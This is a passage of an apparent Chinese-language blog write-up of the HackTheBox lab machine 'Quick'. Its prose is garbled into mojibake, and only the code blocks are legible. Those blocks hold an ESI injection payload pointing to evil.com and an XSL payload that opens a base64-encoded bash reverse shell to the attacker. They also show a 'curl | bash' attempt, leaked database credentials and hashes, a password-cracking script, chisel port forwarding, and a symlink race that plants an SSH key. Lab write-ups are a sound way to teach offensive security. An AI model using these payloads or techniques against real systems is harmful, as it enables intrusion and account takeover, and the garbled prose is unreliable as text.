¼å¼éå¸¸ç±»ä¼¼çœŸå®çš„ä¼ä¸šé‚®ç®±ã€‚å‰é¢æˆ‘ä»¬ä¸»é¡µé¢çš„ä¿¡æ¯ç»“åˆèµ·æ¥åï¼Œå…¶å®æ¯ä¸ªäººåå¯¹åº”çš„å…¬å¸ï¼Œå›½å®¶éƒ½æ˜¯ç¡®å®šçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸»è¦æ³¨æ„é‡‡ç”¨äºŒçº§åŸŸåå³å¯ã€‚ä¹Ÿå°±æ˜¯è·Ÿåœ¨å…¬å¸ååçš„<code>.co.fr</code>,<code>.co.it</code>ç­‰ç­‰ã€‚</p><p>å¾—åˆ°ç”¨æˆ·<code>elisa</code>æˆåŠŸç™»é™†å,æˆ‘ä»¬å°±è¦å‡†å¤‡ç¬¬ä¸‰éƒ¨åˆ†çš„åˆ©ç”¨äº†ã€‚è¿™é‡Œæˆ‘ç›´è§‰çŒœæµ‹åº”è¯¥å¯ä»¥RCE,å› ä¸ºhtbçš„é¶æœºå¦‚æœæ²¡æ³•getshellçš„è¯è¿åé¢çš„ææƒéƒ½åšä¸åˆ°ã€‚å‡ºäºç›´è§‰ä»¥åŠæœ€æ—©çš„ä¿¡æ¯æ”¶é›†ï¼Œæˆ‘è®¤ä¸ºè¿™é‡Œåº”è¯¥æ˜¯ä»headerä¸­æ³„éœ²çš„ä¿¡æ¯ä¸‹æ‰‹<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„åˆ°<code>X-Powered-By: Esigate</code>åç›´æ¥æœç´¢ç›¸å…³ä¿¡æ¯ã€‚äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿ç›¸å…³çš„javaæœåŠ¡ã€‚å¯ä»¥èµ·åˆ°æ­é…phpcmså¹¶ä¸”å°†htmlç‰‡æ®µè¿›è¡Œæ•´åˆçš„ä½œç”¨ã€‚å¹¶ä¸”è¿›ä¸€æ­¥äº†è§£åå‘ç°å­˜åœ¨RCEæ¼æ´ã€‚</p><p>æ‰¾äº†å¥½å‡ ç¯‡æ–‡ç« éƒ½æ²¡æœ‰å…³é”®ä»£ç ã€‚åªæœ‰è¿™ç¯‡æåˆ°äº†<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>è§¦å‘çš„payloadå¦‚ä¸‹ï¼Œæ˜¾ç„¶ä¹Ÿæ˜¯å› ä¸ºå¼•å…¥äº†å¤–éƒ¨çš„æ¶æ„xslå¯¼è‡´RCEã€‚</p><pre><code class="xml">&lt;esi:include src=&quot;http://website.com/&quot; stylesheet=&quot;http://evil.com/esi.xsl&quot;&gt;&lt;/esi:include&gt;</code></pre><p>è¿™é‡Œæˆ‘æ³¨æ„åˆ°å‰é¢çš„srcæ˜¯website.comæ‰€ä»¥æˆ‘åœ¨ä½¿ç”¨è‡ªå·±çš„payloadæ—¶å°†å…¶æ”¹ä¸ºäº†<code>10.10.10.186:9001</code>ã€‚åæ¥ä¹Ÿè¯æ˜å¦‚æœä¸æ”¹çš„è¯ï¼Œè§¦å‘æ—¶ä¼šå‡ºç°<code>error retrieving url</code>çš„æŠ¥é”™ã€‚</p><p>æ¥ä¸‹æ¥åˆ™æ˜¯å°è¯•å¦‚ä½•è§¦å‘çš„é—®é¢˜ã€‚è¿™é‡Œæˆ‘æŒ‰æ‰“CTFçš„ç›´è§‰è®¤ä¸ºåº”è¯¥æ˜¯<code>ticket.php</code>ä¼ payload.<code>search.php</code>ä¼ searchå‚æ•°è¿›è¡Œè§¦å‘ã€‚å½“ç„¶ç½‘é¡µä¹Ÿæé†’äº†ï¼Œå½“ä½ ä¼ å®Œticketåä¼šè¿”å›ä¸€ä¸ªé¢„å…ˆç½®å¥½çš„ticketidã€‚åªè¦åœ¨<code>search.php</code>æœç´¢å¯¹åº”idå³å¯ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ã€‚é‚£å°±æ˜¯javaçš„å‘½ä»¤æ‰§è¡Œé—®é¢˜ã€‚å¼€å§‹å°è¯•è§¦å‘æ—¶å‘ç°ä¸»è¦é—®é¢˜æ˜¯ï¼š</p><ul><li>ä¸€ä¸ªticketä¼ ä¸€æ¬¡åå°±å¤±æ•ˆäº†ã€‚å¯¼è‡´æˆ‘æ¯æ¬¡å¾—æ›´æ”¹xslçš„åå­—ã€‚</li><li>å‘½ä»¤æ‰§è¡Œ<code>curl 10.10.10.14.40|bash</code>å¤±è´¥ã€‚ä¼°è®¡åˆæ˜¯javaçš„é”…ã€‚</li></ul><p>å¦‚æœç¨å¾®è¿‡ä¸€éä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­çš„xsl.ä¼šå‘ç°è‚¯å®šæ˜¯è°ƒç”¨äº†<code>java.lang.Runtime.getRuntime().exec()</code>æ¥æ‰§è¡Œå‘½ä»¤çš„ã€‚æ‰€ä»¥è‚¯å®šå­˜åœ¨å•æ¡å‘½ä»¤ç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜ã€‚å½“ç„¶è§£å†³æ–¹æ³•åœ¨åš<code>vulhub</code>å„ç§javaååºåˆ—åŒ–æ—¶å°±ç”¨çƒ‚äº†ã€‚ä½¿ç”¨ç¼–ç ç»•è¿‡å³å¯ã€‚<br><a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><p>æœ€åæˆ‘çš„xsl payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;&lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&gt;&lt;xsl:template match=&quot;/&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&gt;&lt;root&gt;&lt;xsl:variable name=&quot;cmd&quot;&gt;&lt;![CDATA[bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&gt;&lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&gt;Process: &lt;xsl:value-of select=&quot;$process&quot;/&gt;Command: &lt;xsl:value-of select=&quot;$cmd&quot;/&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><p>å…ˆraiseä¸€ä¸ªticketåå‡†å¤‡å¥½ç›‘å¬ï¼Œsearch.phpä¼ å€¼ç›´æ¥è§¦å‘<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åˆ°æ­¤ä¸ºæ­¢å³å¯å¼¹åˆ°ç”¨æˆ·samçš„shellã€‚æ‹¿åˆ°user.txt</p><p>ä¸Šé¢ä¸€å¥—æµç¨‹èµ°ä¸‹æ¥åèŠ±äº†å¿«æœ‰7ä¸ªå°æ—¶ã€‚åªèƒ½ç®—æ˜¯é…ç¯å¢ƒ(ç”šè‡³è¿˜æ²¡é…æˆ)è·ŸçŒœç”¨æˆ·åçš„é”…ã€‚ä½†åŒæ—¶ä¹Ÿè¡¨ç°å‡º<code>enumeration</code>çš„è¿‡ç¨‹æœ‰å¤šé‡è¦ã€‚å¦åˆ™ç”šè‡³ä¸èƒ½æ­£å¸¸è¿›è¡Œåé¢çš„ææƒã€‚javaçš„å‘½ä»¤æ‰§è¡Œè¿™ä¸ªå°trickå¯¹äºæ–°æ‰‹è€Œè¨€ä¹Ÿè®¸å¾ˆå‘ã€‚ä½†æ˜¯ä»ç„¶æ˜¯æœ‰æ–¹æ³•çš„ã€‚æ¯”å¦‚wgetä¸€ä¸ªnetcatè¿‡å»å†æ‰§è¡Œ(windowså¸¸è§„æ“ä½œï¼Œå°¤å…¶æ˜¯åœ¨windowsdefenderæ—¥æ¸å¼ºå¤§çš„ä»Šå¤©)ã€‚å‡å¦‚ç†Ÿæ‚‰javaçš„è¯åˆ™åº”è¯¥å¾ˆå¿«å°±èƒ½æ„é€ å‡ºå¼¹shellçš„payload.ä¸è‡³äºå¡åœ¨RCEå´æ— æ³•getshell.</p><h2 id="privesc-to-srvadm"><a href="#privesc-to-srvadm" class="headerlink" title="privesc to srvadm"></a>privesc to srvadm</h2><p>å¾—åˆ°ç”¨æˆ·samåå‡†å¤‡å¼€å§‹ææƒã€‚é¦–å…ˆæ˜¯å¸¸è§„çš„<code>linpeas.sh</code>ä¼ åˆ°é¶æœºä¸Šæ‰«ä¸€éã€‚æ¥ç€æ˜¯<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>ç»´æŒshell.æ¯•ç«Ÿä¸€å¥—æµç¨‹ä¸‹æ¥getshellä¹Ÿä¸æ˜¯é‚£ä¹ˆè¿…é€Ÿçš„ã€‚(å½“ç„¶å¯ä»¥å†™ä¸ªsshå…¬é’¥ï¼Œå°±æ˜¯æˆ‘æå¿˜äº†2333)</p><p>è„šæœ¬æ‰«è¿‡ä¸€éåå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚å€’æ˜¯åœ¨<code>html</code>çš„æºç é‡Œæ‰¾åˆ°äº†phpçš„<code>db.php</code>æ³„éœ²äº†æ•°æ®åº“ä¿¡æ¯</p><pre><code class="php">&lt;?php$conn = new mysqli(&quot;localhost&quot;,&quot;db_adm&quot;,&quot;db_p4ss&quot;,&quot;quick&quot;);?&gt;</code></pre><p>ç™»å½•mysqlä»usersè¡¨é‡Œæ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·åŠå„è‡ªå¯†ç çš„hash</p><pre><code>| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d || Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |</code></pre><p>æ­¤æ—¶é¶æœºè¿˜å‰©ä¸‹ä¸€ä¸ªè¦ææƒçš„ç”¨æˆ·<code>srvadm</code>ã€‚è¿™é‡Œæ³„éœ²äº†å¯†ç ï¼Œå½“ç„¶è¦å»phpæºç é‡Œçœ‹çœ‹å¯†ç æ˜¯æ€ä¹ˆä¸hashè¿›è¡Œå¯¹æ¯”çš„<br>login.phpä¸­</p><pre><code class="php">password=md5(crypt($password,&#39;fa&#39;))</code></pre><p>æ—¢ç„¶ç›å€¼ä»¥åŠåŠ å¯†éƒ½ä¸ç®—éš¾ã€‚æˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬+rockyou.txtæ¥è¯•è¯•çˆ†ç ´</p><pre><code class="python">import cryptimport hashlibdef get_md5(s):    md = hashlib.md5()    md.update(s.encode(&#39;utf-8&#39;))    return md.hexdigest()f=open(&#39;rockyou.txt&#39;,&#39;r&#39;)for i in range(1,10000000):    try:        word=f.readline().strip()    except:        continue    hashes=crypt.crypt(word,&#39;fa&#39;)    cipher=get_md5(hashes)    if cipher==&#39;e626d51f8fbfd1124fdea88396c35d05&#39;:        print(&#39;Found: &#39;+word)        break</code></pre><p>å¾—åˆ°srvadmçš„å¯†ç åå½“ç„¶å…ˆè¯•è¯•çœ‹æ˜¯ä¸æ˜¯sshæˆ–è€…ç³»ç»Ÿå¯†ç äº†ã€‚ä½†å¾ˆå¯æƒœéƒ½ä¸æ˜¯ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œè¿™ä¸ªå¯†ç åªèƒ½åœ¨webæœåŠ¡ä¸Šå‘æŒ¥ä½œç”¨äº†ã€‚é‚£ä¹ˆè¯´è¿˜æœ‰å…¶ä»–webæœåŠ¡ï¼Ÿ</p><p>è¿™æ—¶æˆ‘æ³¨æ„åˆ°äº†<code>/var/www/</code>é‡Œé™¤äº†htmlè¿˜æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¯¡å¼‚çš„æ˜¯jobsæ˜¯<code>777</code>æƒé™ã€‚ä¼¼ä¹å¯ä»¥åšæ–‡ç« ã€‚é‚£ä¹ˆè½¬è€Œå»æ—è¾¹çš„printerä¸­æ‰¾ã€‚å‘ç°åˆæ˜¯ä¸€å¥—å¸¦äº†cmsçš„phpæºç ã€‚å¹¶ä¸”ç”¨çš„æ•°æ®åº“è·Ÿä¹‹å‰htmlä¸­çš„æ˜¯ä¸€è‡´çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çˆ†ç ´å‡ºçš„å¯†ç æœ‰ç”¨äº†ã€‚</p><p>ç®€å•å®¡ä¸‹åå‘ç°ä¸€ä¸ªä¼¼ä¹å­˜åœ¨æ¼æ´çš„åœ°æ–¹(å®é™…ä¸Šå½“æ—¶å…³æ³¨ç‚¹é”™äº†)<br>job.php</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/escpos-php/vendor/autoload.php&#39;;use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;use Mike42\Escpos\Printer;include(&quot;db.php&quot;);session_start();if($_SESSION[&quot;loggedin&quot;]){    if(isset($_POST[&quot;submit&quot;]))    {        $title=$_POST[&quot;title&quot;];        $file = date(&quot;Y-m-d_H:i:s&quot;);        file_put_contents(&quot;/var/www/jobs/&quot;.$file,$_POST[&quot;desc&quot;]);        chmod(&quot;/var/www/printer/jobs/&quot;.$file,&quot;0777&quot;);        $stmt=$conn-&gt;prepare(&quot;select ip,port from jobs&quot;);        $stmt-&gt;execute();        $result=$stmt-&gt;get_result();        if($result-&gt;num_rows &gt; 0)        {            $row=$result-&gt;fetch_assoc();            $ip=$row[&quot;ip&quot;];            $port=$row[&quot;port&quot;];            try            {                $connector = new NetworkPrintConnector($ip,$port);                sleep(0.5); //Buffer for socket check                $printer = new Printer($connector);                $printer -&gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));                $printer -&gt; cut();                $printer -&gt; close();                $message=&quot;Job assigned&quot;;                unlink(&quot;/var/www/jobs/&quot;.$file);            }            catch(Exception $error)             {                $error=&quot;Can&#39;t connect to printer.&quot;;                unlink(&quot;/var/www/jobs/&quot;.$file);            }        }        else        {            $error=&quot;Couldn&#39;t find printer.&quot;;        }    }?&gt;&lt;?php } else{    echo &#39;&lt;script&gt;alert(&quot;Invalid Username/Password&quot;);window.location.href=&quot;index.php&quot;;&lt;/script&gt;&#39;;}?&gt;</code></pre><p>å…¶ä¸­ç”¨åˆ°çš„æ¡†æ¶çš„éƒ¨åˆ†ç»æœç´¢åå‘ç°åªæ˜¯ä¸€ä¸ªç±»ä¼¼â€˜æ‰“å°â€™åŠŸèƒ½çš„æ¡†æ¶ã€‚æ¯”å¦‚<code>NetworkPrintConnector</code>å°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ª<code>fsockopen()</code>ã€‚</p><p>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ˜¯æœ€è®©æˆ‘å¤´ç–¼çš„éƒ¨åˆ†ã€‚å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ç»éªŒä¸è¶³å§ã€‚ç°åœ¨æ—¢ç„¶è¦ææƒï¼Œå¹¶ä¸”æœ‰å­˜åœ¨æ¼æ´çš„webæœåŠ¡äº†ï¼Œé‚£ä¹ˆå®ƒè‚¯å®šå¾—æ˜¯<code>srvadm</code>è¿è¡Œçš„ï¼Œæ‰èƒ½è®©æˆ‘æœ‰ææƒæœºä¼šã€‚ç„¶è€Œæˆ‘åœ¨æ‰¾æœåŠ¡è¿™é‡Œå´æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼šå¼€å§‹çœ‹ç«¯å£å‘ç°æœ‰80ç«¯å£ï¼Œäºæ˜¯ç›´æ¥<code>curl</code>.å¾—åˆ°çš„å´æ˜¯ä¹‹å‰9001ç«¯å£çš„php+esigateé¡µé¢ã€‚å¯¼è‡´æˆ‘ä»¥ä¸º80ç«¯å£è¿è¡Œçš„æ˜¯nginxç»™javaåšçš„åä»£ã€‚ä¹‹åæŠŠé¶æœºç«¯å£å…¨è¿‡äº†ä¸€éä¹Ÿæ²¡æœ‰æ‰¾åˆ°å“ªä¸ªç«¯å£æ˜¯è·‘çš„printerçš„webæœåŠ¡ã€‚ç”šè‡³ä¹Ÿæ²¡æ‰¾åˆ°srvadmåœ¨è¿è¡Œä»€ä¹ˆæœåŠ¡çš„ä¿¡æ¯ã€‚å¯¼è‡´è‡ªå·±ç¬é—´è¿·èŒ«ã€‚</p><p>ä¹‹ååœ¨è¿™å—è¯¢é—®äº†ä¸‹å¤–å›½å‹äºº<code>bigFish43</code>ã€‚ä»–ç»™æˆ‘çš„æç¤ºæ˜¯æŸ¥çœ‹ä¸‹apacheçš„configæ–‡ä»¶ã€‚äºæ˜¯æ€è·¯ç¬é—´æ˜æœ—èµ·æ¥ã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åœ¨<code>sites-enabled/000-default.conf</code>é‡Œæ‰¾åˆ°äº†å­åŸŸå<code>printerv2.quick.htb</code>å¹¶ä¸”æ­£å¦‚æ‰€é¢„æ–™çš„ï¼Œæ˜¯ä»¥srvadmç”¨æˆ·è¿è¡Œçš„ã€‚</p><p>apacheçš„<code>virtualhost</code>è·‘åœ¨80ç«¯å£ä¸Šã€‚ä¸è¿‡åŒæ—¶æˆ‘ä»¬çŸ¥é“htmlæ–‡ä»¶å¤¹é‡Œçš„çš„æœåŠ¡ä¹Ÿè·‘åœ¨80ç«¯å£ä¸Šã€‚é‚£ä¹ˆéœ€è¦æ›´æ”¹Hostæ‰èƒ½è®¿é—®<br>é¶æœºä¸Š<br><code>curl localhost -H &#39;Host: printerv2.quick.htb&#39;</code>åç»ˆäºå¾—åˆ°äº†æ¥è‡ªprinterçš„å›æ˜¾ã€‚é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯ï¼Œä¸ºäº†ç›´æ¥åœ¨æœ¬åœ°è®¿é—®åˆ°printerv2.quick.htbï¼Œå¿…é¡»è¦è¿›è¡Œç«¯å£è½¬å‘äº†ã€‚å› ä¸ºæˆ‘ä»¬æœ€æ—©nmapæ¢æµ‹80ç«¯å£æ—¶æ˜¯æ²¡æœ‰å¼€å¯çš„ã€‚è¯´æ˜è¿™é‡ŒapacheæœåŠ¡æ˜¯è¿è¡Œåœ¨æœ¬åœ°çš„ã€‚</p><p>è½¬å‘ç«¯å£åŒæ ·ä¹Ÿæœ‰è‡³å°‘ä¸¤ç§æ–¹æ³•ã€‚sshæˆ–è€…ä¸Šå·¥å…·<code>chisel</code>ã€‚è¿™é‡Œæˆ‘æ²¡æœ‰ç”¨sshç™»å½•ï¼Œæ‰€ä»¥ç›´æ¥ç”¨<code>chisel</code>ã€‚chiselä¹‹å‰åšsniperä¹Ÿç”¨è¿‡äº†ã€‚è¿™é‡Œç›´æ¥ç•™ä¼ å®Œchiselåçš„å‘½ä»¤</p><pre><code class="bash">#kali./chisel_linux_amd64 server -p 8000 --reverse#sam@quick./chisel_linux_amd64 client 10.10.14.40:8000 R:80:127.0.0.1:80</code></pre><p>æ„æ€å°±æ˜¯ï¼Œé¶æœºå€Ÿç”¨8000ç«¯å£çš„ä¸­è½¬ï¼ŒæŠŠé¶æœºçš„80ç«¯å£è½¬åˆ°kaliçš„127.0.0.1:80å³æœ¬åœ°80ç«¯å£.</p><p>è¿™æ ·å°±æŠŠ80ç«¯å£è½¬å‘åˆ°æœ¬åœ°äº†ã€‚æ¥ä¸‹æ¥ç”±äºè¦ä¿®æ”¹hostnameã€‚å› ä¸ºä¸æƒ³å½±å“è®¿é—®ä¹‹å‰çš„ç½‘å€ã€‚ç›´æ¥å¼€ä¸ªburpæ¥ä¿®æ”¹Host header.<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åªè¦ä¿æŒburpæ‰“å¼€ï¼Œæˆ‘ä»¬æ¯æ¬¡è®¿é—®çš„Hostéƒ½ä¼šè¢«æ›¿æ¢.<br>å³å¯åœ¨æœ¬åœ°è®¿é—®è¿›è¡Œæ“ä½œã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ¸—é€çš„éš¾ç‚¹äº†ã€‚å‰é¢æåˆ°è¯´job.phpçœ‹èµ·æ¥æœ‰æ¼æ´ï¼Œä½†ç©¶ç«Ÿæ¼æ´åœ¨å“ªï¼Ÿå¼€å§‹æˆ‘è§‰å¾—æœ‰æ¼æ´æ˜¯å› ä¸ºé‡Œé¢å‡ºç°äº†<code>chmod(xxx,777)</code>ã€‚ä½†ä»”ç»†ä¸€çœ‹å´å‘ç°é‚£ä¸ª<code>/var/www/printer/jobs</code>è·¯å¾„ä¸å­˜åœ¨ï¼Ÿæ—¢ç„¶å¦‚æ­¤ï¼Œä»£ç é€»è¾‘å°±æ˜¯ï¼š</p><ul><li>æ¥å—æˆ‘ä»¬postçš„å‚æ•°ï¼Œæ‰§è¡Œ<code>file_put_contents()</code>åœ¨<code>/var/www/jobs</code>å†™å…¥ä¸€ä¸ªæ–‡ä»¶åä¸ºå½“å‰æ—¥æœŸçš„æ–‡ä»¶ã€‚å¹¶ä¸”chmodä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚</li><li>æ‰§è¡ŒsqlæŸ¥è¯¢ã€‚å‡å¦‚jobsåº“é‡Œæœ‰å†…å®¹ã€‚æŒ‰ç…§æŸ¥è¯¢ç»“æœè¿œç¨‹è¿æ¥åˆ°å¯¹åº”çš„ip,port.sleep(0.5)åæ‰§è¡Œ<code>file_get_contents()</code>è¯»æˆ‘ä»¬ä¹‹å‰çš„æ–‡ä»¶ï¼Œå¹¶æœ€ååˆ é™¤;jobsåº“æ— å†…å®¹ç›´æ¥é€€å‡ºã€‚</li></ul><p>è¿™é‡Œå¡äº†å¥½ä¹…åæˆ‘çªç„¶æƒ³èµ·æ¥<code>/var/www/jobs</code>æ–‡ä»¶å¤¹æ˜¯777æƒé™ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™æ–‡ä»¶è¿™ç‚¹å°±éå¸¸é‡è¦ã€‚äºæ˜¯ç«‹åˆ»å°±æœ‰äº†ä¸¤ç§ä½¿ç”¨çŸ­é“¾æ¥çš„æ¡ä»¶ç«äº‰</p><ul><li><p>ä¸è¦åœ¨æ•°æ®åº“ä¸­æ’å…¥æ–°æ•°æ®ã€‚è¿™æ ·srvadmåˆ›å»ºçš„æ–‡ä»¶å°±ä¼šç•™ä¸‹æ¥ã€‚å¦‚æœæˆ‘ä»¬æå‰åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶(å› ä¸ºæ–‡ä»¶åä¸ºæ—¶é—´è¿™ç‚¹æ˜¯å¯é¢„æµ‹çš„)ã€‚å¹¶åˆ©ç”¨<strong>çŸ­é“¾æ¥</strong>å°†å…¶é“¾æ¥å‘srvadmçš„sshkey.é‚£ä¹ˆæ‰§è¡Œ<code>file_put_contents()</code>æ—¶ä¸å°±å¯ä»¥å†™å…¥æˆ‘ä»¬è‡ªå·±çš„å…¬é’¥äº†å—ï¼Ÿ</p></li><li><p>åœ¨å‰é¢printer.phpå°±è¾“å…¥hostè·Ÿport.å³åœ¨æ•°æ®åº“æ’å…¥æ•°æ®ã€‚è¿™æ ·job.phpå°±ä¼šè¿›è¡Œè¯»æ–‡ä»¶å¹¶æ‰“å°å†…å®¹ã€‚è€Œæˆ‘ä»¬å¯ä»¥ç”¨ncæ¥æ”¶ã€‚åªè¦åœ¨å†™æ–‡ä»¶è·Ÿè¯»æ–‡ä»¶çš„é—´éš”ä¸­åˆ æ‰æ–‡ä»¶å¹¶å»ºç«‹ä¸€ä¸ªåˆ°sshç§é’¥çš„<strong>çŸ­é“¾æ¥</strong>ã€‚phpå°±ä¼šæŠŠè¯»åˆ°çš„ç§é’¥å‘ç»™æˆ‘ä»¬ã€‚</p></li></ul><p>è¿™é‡Œä¸¤ç§æ€è·¯åŒæ—¶æƒ³åˆ°ï¼Œæˆ‘ç«‹åˆ»é€‰æ‹©äº†å‰è€…ã€‚å› ä¸ºåè€…ç®—æ¯”è¾ƒçº¯ç²¹çš„æ¡ä»¶ç«äº‰,æ—¶é—´ä¸å¥½æŠŠæ§(æ‰€ä»¥å«<code>Quick</code>)ï¼Œæˆ‘é€‰æ‹©å‰è€…ã€‚</p><p>æ“ä½œèµ·æ¥æ¯”æƒ³è±¡ä¸­ç®€å•ã€‚æˆ‘ä¸€æ¬¡å°±æˆäº†ã€‚å‡å¦‚åŒæ—¶åšé¶æœºçš„äººæ¯”è¾ƒå¤šçš„è¯å°±å¦è°ˆï¼Œ<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…¶å®å°±æ˜¯ç®—å¥½ä¸€ä¸ªæå‰é‡ã€‚å¹¶ä¸”æ‰§è¡Œ</p><pre><code class="bash">ln -s /home/srvadm/.ssh/authorized_keys 2020-06-23_06:00:00</code></pre><p>ç„¶åå·®ä¸å¤šç®—å¥½æ—¶é—´æå‰burpé‡å¤å‘åŒ…ã€‚<br>è¿™é‡Œå› ä¸ºç²¾åº¦è¢«é™åˆ¶åœ¨1s.æ‰€ä»¥å†™å…¥æˆ‘ä»¬çš„keyçš„å¯èƒ½æ€§ä¸å°ã€‚</p><p>ä¹‹åç›´æ¥sshç™»å½•å³å¯</p><pre><code class="bash">chmod 600 id_rsassh -i id_rsa 